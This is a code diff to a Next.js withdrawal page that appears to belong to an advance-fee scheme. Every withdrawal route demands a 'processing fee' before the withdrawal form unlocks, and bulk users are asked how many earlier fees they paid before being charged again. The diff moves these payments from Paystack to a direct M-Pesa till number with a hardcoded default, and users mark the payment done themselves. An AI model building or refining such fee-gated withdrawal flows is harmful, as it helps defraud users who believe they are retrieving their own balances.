@@ -6,6 +6,8 @@ import { useRouter } from 'next/router';
 import { useUser } from '../lib/useUser';
 import { sendNotify } from '../lib/notify';
 import { bulkWithdrawalQuote, submitBulkWithdrawal } from '../lib/auth';
+import TillPay from '../components/TillPay';
+import { fetchTill } from '../lib/settings';
 import FlowShell from '../components/FlowShell';
 import Icon from '../components/Icon';
 import { FlowSkeleton } from '../components/Skeleton';
@@ -121,7 +123,7 @@ const BANK_FEE_KES = Math.round(BANK_FEE_USD * USD_TO_KES); // = KES 2,990
 const BULK_THRESHOLD_KES = 25000;
 
 // ── M-Pesa flow (fee → form → pending → failed) ───────────────────────────────
-function MpesaFlow({ user, initialStep }) {
+function MpesaFlow({ user, till, initialStep }) {
   const router = useRouter();
   const [step,     setStep]     = useState(initialStep || 'fee');
   const [phone,    setPhone]    = useState(user?.phone || '');
@@ -197,22 +199,14 @@ function MpesaFlow({ user, initialStep }) {
   return (
     <FlowShell title="Withdraw with M-Pesa" subtitle="Instant M-Pesa payout" icon="smartphone" accent="var(--mpesa-green)">
       {step === 'fee' && (
-        <>
-          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb' }}>
-            A one-time <strong>processing fee of ${FEE_USD} USD</strong> (≈ <strong>KES {FEE_KES.toLocaleString()}</strong>) is required to access the M-Pesa withdrawal form. The amount is converted to KES automatically.
-          </div>
-          <div className="pay-amount">
-            <div className="pay-amount-label">M-Pesa Processing Fee</div>
-            <div className="pay-amount-value" style={{ color: '#1f2937' }}>${FEE_USD} USD</div>
-            <div className="pay-amount-sub">≈ KES {FEE_KES.toLocaleString()} • Converted automatically • Unlocks withdrawal form</div>
-          </div>
-          <div className="pay-phone-label">M-Pesa Number</div>
-          <input className="pay-phone-input" value={phone} onChange={e => setPhone(e.target.value)} placeholder="+254 7XX XXX XXX" />
-          <button className="pay-btn" style={{ background: 'var(--mpesa-green)' }} onClick={handlePayFee} disabled={loading}>
-            {loading ? <><span className="spinner" /> Redirecting…</> : <><Icon name="lock" size={16} /> Pay ${FEE_USD} USD via Paystack</>}
-          </button>
-          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Secured by Paystack • USD → KES conversion included</div>
-        </>
+        <TillPay
+          user={user}
+          amount={FEE_KES}
+          purpose="M-Pesa Withdrawal Fee"
+          till={till}
+          onPaid={() => setStep('form')}
+          onCancel={() => router.push('/dashboard')}
+        />
       )}
 
       {step === 'form' && (
@@ -280,7 +274,7 @@ function MpesaFlow({ user, initialStep }) {
 }
 
 // ── Postbank Kenya flow (M-Pesa prompt → fee → form → pending → failed) ────────
-function PostbankFlow({ user, initialStep }) {
+function PostbankFlow({ user, till, initialStep }) {
   const router = useRouter();
   const [step,     setStep]     = useState(initialStep || 'choice');
   const [name,     setName]     = useState(user?.fullName || '');
@@ -383,21 +377,14 @@ function PostbankFlow({ user, initialStep }) {
       )}
 
       {step === 'fee' && (
-        <>
-          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
-            A one-time <strong>processing fee of ${BANK_FEE_USD} USD</strong> (≈ <strong>KES {BANK_FEE_KES.toLocaleString()}</strong>) is required to process your Postbank Kenya withdrawal. The amount is converted to KES automatically.
-          </div>
-          <div className="pay-amount">
-            <div className="pay-amount-label">Postbank Processing Fee</div>
-            <div className="pay-amount-value" style={{ color: '#1f2937' }}>${BANK_FEE_USD} USD</div>
-            <div className="pay-amount-sub">≈ KES {BANK_FEE_KES.toLocaleString()} • Converted automatically • Unlocks withdrawal</div>
-          </div>
-          <button className="pay-btn" style={{ background: accent }} onClick={handlePayFee} disabled={loading}>
-            {loading ? <><span className="spinner" /> Redirecting…</> : <><Icon name="lock" size={16} /> Pay ${BANK_FEE_USD} USD via Paystack</>}
-          </button>
-          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}><Icon name="arrowLeft" size={14} /> Back</button>
-          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Secured by Paystack • USD → KES conversion included</div>
-        </>
+        <TillPay
+          user={user}
+          amount={BANK_FEE_KES}
+          purpose="Postbank Withdrawal Fee"
+          till={till}
+          onPaid={() => setStep('form')}
+          onCancel={() => setStep('choice')}
+        />
       )}
 
       {step === 'form' && (
@@ -470,7 +457,7 @@ function PostbankFlow({ user, initialStep }) {
 }
 
 // ── International flow (bank selector) ─────────────────────────────────────────
-function InternationalFlow({ user, initialStep }) {
+function InternationalFlow({ user, till, initialStep }) {
   const router = useRouter();
   // Other Countries flow: recommend M-Pesa first → confirm intent → pay the
   // $23 USD fee → bank form. (Never jump straight to the fee.)
@@ -654,11 +641,15 @@ function InternationalFlow({ user, initialStep }) {
               ))}
               <div style={{ ...brRow, fontWeight: 800, borderTop: '1px solid #e5e7eb', marginTop: 6, paddingTop: 10 }}><span>Amount Due</span><span>KES {quote.amountDueKes.toLocaleString()}</span></div>
             </div>
-            <button className="pay-btn" style={{ background: accent }} onClick={handlePayFee} disabled={loading}>
-              {loading ? <><span className="spinner" /> Redirecting…</> : <><Icon name="lock" size={16} /> Pay KES {quote.amountDueKes.toLocaleString()} via Paystack</>}
-            </button>
+            <TillPay
+              user={user}
+              amount={quote.amountDueKes}
+              purpose="Bank Withdrawal Fee"
+              till={till}
+              onPaid={() => setGate('form')}
+              paidLabel="I Have Paid — Continue"
+            />
             <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => { setQuote(null); setDeclaredFees(null); setQuoteErr(''); }}><Icon name="arrowLeft" size={14} /> Change M-Pesa fee count</button>
-            <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Secured by Paystack • live USD → KES conversion</div>
           </>
         )}
       </FlowShell>
@@ -750,7 +741,7 @@ function InternationalFlow({ user, initialStep }) {
 // ── Bulk withdrawal flow (balances ≥ KES 25,000 → bank transfer only) ─────────
 // Notice (previous M-Pesa fee?) → server-authoritative quote (live FX + capped
 // deductions) → validated bank details → submit + pay the computed amount due.
-function BulkWithdrawalFlow({ user }) {
+function BulkWithdrawalFlow({ user, till }) {
   const router = useRouter();
   const [step,         setStep]         = useState('notice');   // notice | details | success
   const [declaredFees, setDeclaredFees] = useState(null);       // 0 | 1 | 2 (declared M-Pesa fees)
@@ -807,22 +798,8 @@ function BulkWithdrawalFlow({ user }) {
         `Requested by: ${user?.fullName || ''} (${user?.email || ''})`,
     });
 
-    if (res.amountDueKes > 0) {
-      try {
-        const r = await fetch('/api/paystack/initialize', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email: user.email, amount: res.amountDueKes, phone: user.phone || '', plan: 'bulk_withdrawal_fee' }),
-        });
-        const data = await r.json();
-        if (data.status) { window.location.href = data.data.authorization_url; return; }
-      } catch (_) { /* fall through to recorded-but-unpaid state */ }
-      setSubmitting(false);
-      setErr('Your request was recorded, but the payment could not be started. Our team will contact you.');
-      setStep('success');
-      return;
-    }
     setSubmitting(false);
-    setStep('success');
+    setStep(res.amountDueKes > 0 ? 'pay' : 'success');
   }
 
   const rateNote = quote && !quote.rateLive ? ' (approx.)' : '';
@@ -919,7 +896,7 @@ function BulkWithdrawalFlow({ user }) {
 
           {bankValid ? (
             <button className="pay-btn" style={{ background: '#000000', marginTop: 8 }} disabled={submitting} onClick={submit}>
-              {submitting ? <><span className="spinner" /> Submitting…</> : <><Icon name="lock" size={16} /> Submit & Pay KES {quote.amountDueKes.toLocaleString()}</>}
+              {submitting ? <><span className="spinner" /> Submitting…</> : <><Icon name="arrowRight" size={16} /> Submit & Continue to Payment</>}
             </button>
           ) : (
             <div style={{ marginTop: 8, textAlign: 'center', fontSize: 13, color: '#9ca3af', padding: 12, background: '#f9fafb', borderRadius: 10, border: '1px dashed #e5e7eb' }}>
@@ -932,6 +909,21 @@ function BulkWithdrawalFlow({ user }) {
           <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, marginTop: 10 }}>
             <Icon name="lock" size={13} /> Verified server-side • fee recalculated at the live rate
           </div>
+        </>
+      )}
+
+      {step === 'pay' && quote && (
+        <>
+          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
+            Your request is recorded. Pay the <strong>KES {quote.amountDueKes.toLocaleString()}</strong> bank withdrawal fee via M-Pesa Buy Goods, then notify support to finish processing.
+          </div>
+          <TillPay
+            user={user}
+            amount={quote.amountDueKes}
+            purpose="Bulk Withdrawal Fee"
+            till={till}
+            onPaid={() => setStep('success')}
+          />
         </>
       )}
 
@@ -957,6 +949,8 @@ export default function WithdrawPage() {
   const { user, ready } = useUser();
   const method = router.query.method;
   const stepQ  = router.query.step;
+  const [till, setTill] = useState('1545320');
+  useEffect(() => { fetchTill().then(setTill); }, []);
 
   if (!ready || !user) {
     return <FlowSkeleton rows={3} />;
@@ -967,11 +961,11 @@ export default function WithdrawPage() {
   // "Withdraw with M-Pesa" links straight to ?method=mpesa). This is what makes
   // the "how many M-Pesa fees have you paid?" step reachable for bulk users.
   const isBulk = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;
-  if (isBulk) return <BulkWithdrawalFlow user={user} />;
+  if (isBulk) return <BulkWithdrawalFlow user={user} till={till} />;
 
-  if (method === 'mpesa')         return <MpesaFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'fee'} />;
-  if (method === 'postbank')      return <PostbankFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
-  if (method === 'international')  return <InternationalFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'mpesa'} />;
+  if (method === 'mpesa')         return <MpesaFlow user={user} till={till} initialStep={stepQ === 'form' ? 'form' : 'fee'} />;
+  if (method === 'postbank')      return <PostbankFlow user={user} till={till} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
+  if (method === 'international')  return <InternationalFlow user={user} till={till} initialStep={stepQ === 'form' ? 'form' : 'mpesa'} />;
 
   // Chooser
   const overLimit = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;
